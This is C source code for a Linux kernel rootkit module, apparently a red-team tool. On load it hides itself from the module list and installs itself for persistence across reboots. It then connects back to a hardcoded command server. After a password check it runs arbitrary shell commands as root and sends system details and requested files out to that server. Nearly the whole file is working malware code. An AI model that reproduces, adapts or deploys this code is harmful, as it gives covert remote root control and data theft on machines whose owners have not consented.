#define BUF_SIZE 4096

#include <linux/binfmts.h>
#include <linux/delay.h>
#include <linux/fs.h>
#include <linux/inet.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kmod.h>
#include <linux/kthread.h>
#include <linux/module.h>
#include <linux/list.h>
#include <linux/net.h>
#include <linux/sched/task.h>
#include <linux/slab.h>
#include <linux/socket.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <linux/user_namespace.h>
#include <linux/crypto.h>
#include <linux/err.h>
#include <linux/scatterlist.h>
#include <linux/slab.h>
#include <linux/kobject.h>
#include <linux/utsname.h>


MODULE_LICENSE("GPL");
MODULE_AUTHOR("RedTeam");
MODULE_DESCRIPTION("Connect to TCP server, receive commands, run ls/cat/mv");

static char *ip = "192.168.100.10";
static int port = 4242;
static char *output_file = "/tmp/execls_output";
static char *ls_file = "/";
module_param(ip, charp, 0644);
module_param(port, int, 0644);
module_param(ls_file, charp, 0644);
MODULE_PARM_DESC(ip, "Server IPv4");
MODULE_PARM_DESC(port, "Server port");
MODULE_PARM_DESC(ls_file, "File to list");

static char *read_file_to_buf(const char *filename, loff_t *size_out);
static bool match_key(const char *line, const char *key);
int retrive_info(void);
void handle_command(const char *buf);
int recv_loop(void *data);
void *convert(void *ptr);
int reconnect_to_server(void);
static struct socket *sock;
static struct task_struct *recv_thread;
static struct list_head *prev_module;
static int hidden = 0;
static int authed = 0;

static int send_output(const char *buf, size_t len)
{
    struct socket *s;
    struct sockaddr_in addr = {};
    struct msghdr msg = {};
    struct kvec vec = { .iov_base = (void *)buf, .iov_len = len };
    unsigned char addr_buf[4];
    int ret;

    if (!in4_pton(ip, -1, addr_buf, -1, NULL))
        return -EINVAL;
    ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &s);
    if (ret < 0)
        return ret;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    memcpy(&addr.sin_addr.s_addr, addr_buf, 4);
    ret = s->ops->connect(s, (struct sockaddr *)&addr, sizeof(addr), 0);
    if (ret < 0)
    {
        sock_release(s);
        return ret;
    }
    ret = kernel_sendmsg(s, &msg, &vec, 1, len);
    sock_release(s);
    return ret;
}

void hide_module(void) {
    if (hidden)
        return;

    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    hidden = 1;
}

void show_module(void) {
    if (!hidden)
        return;

    list_add(&THIS_MODULE->list, prev_module);
    hidden = 0;
}


int exec_shell_command(const char *command)
{
    char return_info[64];
    struct file *f;
    loff_t size, pos = 0;
    char *cmd;
    char *buf;
    int ret;
    char *argv[] = { "/bin/sh", "-c", NULL, NULL };
    char *envp[] = { "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    int umh_ret;
    int final_len;
    char *full_buf;

    cmd = kasprintf(GFP_KERNEL, "%s > %s 2>&1", command, output_file);
    if (!cmd)
        return -ENOMEM;

    argv[2] = cmd;

    umh_ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    kfree(cmd);

    f = filp_open(output_file, O_RDONLY, 0);
    if (IS_ERR(f))
        return PTR_ERR(f);

    size = i_size_read(file_inode(f));
    buf = kmalloc(size + 1, GFP_KERNEL);
    if (!buf) {
        filp_close(f, NULL);
        return -ENOMEM;
    }

    ret = kernel_read(f, buf, size, &pos);
    filp_close(f, NULL);
    if (ret < 0) {
        kfree(buf);
        return ret;
    }
    buf[ret] = '\0';

    snprintf(return_info, sizeof(return_info), "\nreturn code: %d\n", umh_ret);

    final_len = ret + strlen(return_info);
    full_buf = kmalloc(final_len + 1, GFP_KERNEL);
    if (!full_buf) {
        kfree(buf);
        return -ENOMEM;
    }

    memcpy(full_buf, buf, ret);
    memcpy(full_buf + ret, return_info, strlen(return_info));
    full_buf[final_len] = '\0';

    ret = send_output(full_buf, final_len);

    kfree(buf);
    kfree(full_buf);

    return umh_ret;
}

// Helper pour lire un fichier complet dans un buffer (jusqu'à BUF_SIZE max)
static char *read_file_to_buf(const char *filename, loff_t *size_out)
{
    struct file *f;
    char *buf;
    loff_t pos = 0;
    ssize_t ret, total = 0;

    f = filp_open(filename, O_RDONLY, 0);
    if (IS_ERR(f))
        return NULL;

    buf = kmalloc(BUF_SIZE + 1, GFP_KERNEL);
    if (!buf) {
        filp_close(f, NULL);
        return NULL;
    }

    while (total < BUF_SIZE) {
        ret = kernel_read(f, buf + total, BUF_SIZE - total, &pos);
        if (ret <= 0)
            break;
        total += ret;
    }

    filp_close(f, NULL);
    buf[total] = '\0';
    if (size_out)
        *size_out = total;

    return buf;
}

// Vérifie si une ligne commence par une clé donnée
static bool match_key(const char *line, const char *key)
{
    return strncmp(line, key, strlen(key)) == 0;
}

int retrive_info(void)
{
    char *cpuinfo, *meminfo, *issue;
    char *cpuinfo_orig, *meminfo_orig;
    loff_t size;
    char *line;
    char *final_buf;
    size_t offset = 0;

    final_buf = kzalloc(BUF_SIZE, GFP_KERNEL);
    if (!final_buf)
        return -ENOMEM;

    // ==== CPU INFO ====
    cpuinfo = read_file_to_buf("/proc/cpuinfo", &size);
    if (cpuinfo) {
        cpuinfo_orig = cpuinfo;
        offset += scnprintf(final_buf + offset, BUF_SIZE - offset, "=== CPU INFO ===\n");
        while ((line = strsep(&cpuinfo, "\n")) != NULL) {
            if (match_key(line, "model name") ||
                match_key(line, "cpu cores") ||
                match_key(line, "cpu MHz")) {
                offset += scnprintf(final_buf + offset, BUF_SIZE - offset, "%s\n", line);
            }
        }
        kfree(cpuinfo_orig);
    }

    // ==== MEMORY INFO ====
    meminfo = read_file_to_buf("/proc/meminfo", &size);
    if (meminfo) {
        meminfo_orig = meminfo;
        offset += scnprintf(final_buf + offset, BUF_SIZE - offset, "== MEMORY INFO ==\n");
        while ((line = strsep(&meminfo, "\n")) != NULL) {
            if (match_key(line, "MemTotal") ||
                match_key(line, "MemFree")) {
                offset += scnprintf(final_buf + offset, BUF_SIZE - offset, "%s\n", line);
            }
        }
        kfree(meminfo_orig);
    }

    // ==== OS VERSION ====
    issue = read_file_to_buf("/etc/issue", &size);
    if (issue) {
        offset += scnprintf(final_buf + offset, BUF_SIZE - offset, "=== OS VERSION ===\n");
        offset += scnprintf(final_buf + offset, BUF_SIZE - offset, "%s\n", issue);
        kfree(issue);
    }

    // Envoi
    send_output(final_buf, offset);
    kfree(final_buf);

    return 0;
}

int download_file(const char *filepath)
{
    struct file *f;
    loff_t pos = 0;
    ssize_t ret;
    char *buf;

    f = filp_open(filepath, O_RDONLY, 0);
    if (IS_ERR(f))
        return send_output("file not found\n", 15);

    buf = kmalloc(BUF_SIZE, GFP_KERNEL);
    if (!buf) {
        filp_close(f, NULL);
        return send_output("memory error\n", 14);
    }

    while (true) {
        ret = kernel_read(f, buf, BUF_SIZE, &pos);
        if (ret <= 0)
            break;
        send_output(buf, ret);
    }

    filp_close(f, NULL);
    kfree(buf);
    return 0;
}


void handle_command(const char *buf)
{
    char *cmd, *copy, *copy2;
    copy = kmalloc(strlen(buf) + 1, GFP_KERNEL);
    copy2 = kmalloc(strlen(buf) + 1, GFP_KERNEL);
    if (!copy)
        return;
    strcpy(copy, buf);
    strcpy(copy2,buf);
    cmd = strsep(&copy, " ");
    if (cmd)
        cmd[strcspn(cmd, "\r\n")] = 0;
    if (!cmd)
    {
        kfree(copy);
        return;
    }

    if (!authed){
        if (!strcmp(cmd, "ueAjv3uanK4qgWJSlPHlOg=="))
        {
            send_output("success", 8);
            authed = 1;
        }
        else{
            send_output("wrong password",15);
        }
    }
    else {
        if (!strcmp(cmd,"infos"))
        {
            retrive_info();
        }
        else if (!strcmp(cmd, "hide"))
        {
            hide_module();
            send_output("module hide", 12);
        }
        else if (!strcmp(cmd, "show"))
        {
            show_module();
            send_output("module show", 12);
        }
        else if (!strcmp(cmd, "disconnect"))
        {
            authed = 0;
            send_output("disconnected", 13);
        }
        else if (!strcmp(cmd, "download")) {
            char *filepath = strsep(&copy, " ");
            if (filepath && *filepath) {
                filepath[strcspn(filepath, "\r\n")] = 0;
                download_file(filepath);
            } else {
                send_output("missing filepath", 16);
            }
        }
        else {
            exec_shell_command(copy2);
        }
    }
    kfree(copy);
}

int make_persistent(void)
{
    struct new_utsname *u = utsname();
    char *cmd;
    char *argv[] = { "/bin/sh", "-c", NULL, NULL };
    char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };

    cmd = kasprintf(GFP_KERNEL,
        "mkdir -p /lib/modules/%s/kernel/extra",
        u->release);
    if (!cmd) return -ENOMEM;
    argv[2] = cmd;
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    kfree(cmd);

    cmd = kasprintf(GFP_KERNEL,
        "cp /home/debian/rootkit/rootkit.ko /lib/modules/%s/kernel/extra/",
        u->release);
    if (!cmd) return -ENOMEM;
    argv[2] = cmd;
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    kfree(cmd);

    cmd = kasprintf(GFP_KERNEL, "echo rootkit > /etc/modules-load.d/rootkit.conf");
    if (!cmd) return -ENOMEM;
    argv[2] = cmd;
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    kfree(cmd);

    cmd = kasprintf(GFP_KERNEL, "depmod %s", u->release);
    if (!cmd) return -ENOMEM;
    argv[2] = cmd;
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    kfree(cmd);

    return 0;
}

int reconnect_to_server(void)
{
    struct sockaddr_in addr = {};
    unsigned char addr_buf[4];
    int ret;
    if (!in4_pton(ip, -1, addr_buf, -1, NULL))
        return -EINVAL;
    ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
    if (ret < 0)
        return ret;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    memcpy(&addr.sin_addr.s_addr, addr_buf, 4);
    while (!kthread_should_stop())
    {
        ret = sock->ops->connect(sock, convert(&addr), sizeof(addr), 0);
        if (ret >= 0)
            break;
        msleep_interruptible(2000);
    }
    return ret;
}

void *convert(void *ptr)
{
    return ptr;
}

int recv_loop(void *data)
{
    struct msghdr msg;
    struct kvec vec;
    char buffer[128];
    int ret;
    while (!kthread_should_stop())
    {
        memset(&msg, 0, sizeof(msg));
        memset(buffer, 0, sizeof(buffer));
        vec.iov_base = buffer;
        vec.iov_len = sizeof(buffer) - 1;
        ret = kernel_recvmsg(sock, &msg, &vec, 1, sizeof(buffer) - 1,
                             MSG_DONTWAIT);
        if (ret > 0)
            handle_command(buffer);
        else if (ret == 0)
        {
            sock_release(sock);
            reconnect_to_server();
            authed = 0;
        }
        else if (ret != -EAGAIN && ret != -EWOULDBLOCK)
        {
            sock_release(sock);
            reconnect_to_server();
            authed = 0;
        }
        msleep_interruptible(50);
    }
    return 0;
}

int connect(void *data){
    while (1)
    {
        struct sockaddr_in addr = {};
        unsigned char addr_buf[4];
        int ret;

        if (!in4_pton(ip, -1, addr_buf, -1, NULL)) {
            goto wait_and_retry;
        }

        ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
        if (ret < 0) {
            goto wait_and_retry;
        }

        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        memcpy(&addr.sin_addr.s_addr, addr_buf, 4);

        ret = sock->ops->connect(sock, convert(&addr), sizeof(addr), 0);
        if (ret < 0) {
            sock_release(sock);
            goto wait_and_retry;
        }

        recv_thread = kthread_run(recv_loop, NULL, "recv_thread");
        if (IS_ERR(recv_thread)) {
            sock_release(sock);
            goto wait_and_retry;
        }

        break;

    wait_and_retry:
        msleep(2000);
    }
    return 0;
}

static int __init rootkit_init(void)
{
    hide_module();
    make_persistent();
    recv_thread = kthread_run(connect, NULL, "connect_thread");
    return 0;
}

static void __exit rootkit_exit(void)
{
    if (hidden)
        show_module();
    if (recv_thread)
        kthread_stop(recv_thread);
    if (sock)
        sock_release(sock);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
